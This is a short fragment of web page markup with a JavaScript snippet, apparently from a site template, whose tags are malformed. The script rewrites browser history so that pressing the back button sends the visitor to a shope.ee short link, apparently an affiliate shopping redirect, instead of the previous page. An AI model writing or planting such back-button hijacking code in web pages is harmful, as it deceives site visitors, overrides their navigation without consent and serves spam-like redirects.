type='text/javascript'>
//<![CDATA[
<script type="text/javascript" language="javascript">
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);
window.addEventListener("popstate", function() {
 if(location.hash === "#!/history") {
 history.replaceState(null, document.title, location.pathname);
 setTimeout(function(){
 location.replace("https://shope.ee/6Uhmz5pJ0c");
 },10);
 }
}, false);
}(window, location));
</script>
//]]
